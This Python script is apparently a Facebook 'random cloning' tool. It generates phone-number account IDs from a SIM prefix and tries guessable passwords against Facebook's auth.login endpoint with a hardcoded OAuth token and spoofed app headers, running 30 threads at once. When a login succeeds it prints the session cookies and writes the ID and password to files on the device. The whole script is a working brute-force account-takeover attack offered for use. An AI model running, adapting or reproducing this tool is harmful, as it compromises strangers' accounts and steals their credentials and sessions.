#--------------++CREATED     +PRINCE RONI++-----------------#
#--------------++FACEBOOK  + PRINCE RONI++----------------#
#--------------++ GITHUB        + ASIF1433+--------------------------#

import os
os.system("pip uninstall requests -y")
os.system("pip install requests")
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
from bs4 import BeautifulSoup as bxx
import re
import sys
import uuid
import json
import platform,math,smtplib
import platform
import smtplib
import math
import httpx
import os,base64,zlib,pip,urllib
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3

print('\n\033[1;37m install modules...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ASIF.py')


# os.system('xdg-open https://www.facebook.com/profile.php?id=100086270594350/?ref=share')
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0




logo=(f'''{B}\033[0;92m

██╗  ██╗ █████╗ ██╗  ██╗   ██╗ █████╗ ███╗   ██╗    
██║ ██╔╝██╔══██╗██║  ╚██╗ ██╔╝██╔══██╗████╗  ██║    
█████╔╝ ███████║██║   ╚████╔╝ ███████║██╔██╗ ██║    
██╔═██╗ ██╔══██║██║    ╚██╔╝  ██╔══██║██║╚██╗██║    
██║  ██╗██║  ██║███████╗██║   ██║  ██║██║ ╚████║    
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     
<==============================>
╠══[TOOLS                    • FREE]         
╠══[VERSION                  • 1.3]           
<==============================>

--------------------------------------------{B}''')

def linex():
    print(f'{warna}--------------------------------------------{B}')

def clear():
    clr('clear')
    print(logo)

def TARA_LOVE():
    clear()
    os.system('xdg-open https://github.com/ASIF-1433')
    print(f'{B} [{warna}01{B}] \33[0;41mRANDOM CLONING\033[0;92m ')
    print(f'{B} [{warna}02{B}] \33[0;41mJOIN FB GROUP\033[0;92m ')
    print(f'{B} [{warna}03{B}] CONTACT ADMIN')
    print(f'{B} [{warna}00{B}] EXIT PROGRAMING')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOOSE OPTION>> ')
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://facebook.com/groups/1036123894351028/?ref=share');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://www.facebook.com/profile.php?id=100086270594350 ');time.sleep(1)
    else:
        exit(' Thanks for using dear :)')

def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Tara:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' \33[0;42mFAST SPEED CLONING\033[0;92m ')
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            Tara.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    TARA_LOVE()

def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[FINDING] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    break
                else:
                    print('\r\r \033[1;32m[KGF-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌸] '+coki)
                    open('/sdcard/KGF-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[KGF-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/KGF-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
#------------------module--------------------#
import requests
from bs4 import BeautifulSoup as bxx
#-------------------lock cheak---------------#
def lock_check(uid):
	sessionx=requests.Session()
	urlx=f'https://www.facebok.com/p/{uid}'
	req=bxx(sessionx.get(urlx).content,'html.parser')
	tx=req.find('title').txt
	if tx =='FACEBOOK':
		return('LOCK')
	else:
		return('LIVE')        

TARA_LOVE()